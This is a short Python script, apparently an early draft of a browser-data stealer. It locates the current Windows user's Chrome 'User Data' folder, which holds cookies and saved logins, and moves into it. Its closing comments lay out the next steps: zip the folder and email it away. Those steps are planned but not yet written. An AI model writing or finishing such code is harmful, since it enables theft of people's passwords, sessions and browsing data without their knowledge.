import os
import zipfile

# C:\Users\JohnBradshawCantos\AppData\Local\Google\Chrome\User Data\Default

# Find the user of computer and store it
user = os.getlogin()


# Getting the directory 
chrome_data_dir = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"
os.chdir(chrome_data_dir)
print(os.getcwd())



# Function to zip folder containing the data

# Function to send zip folder to email address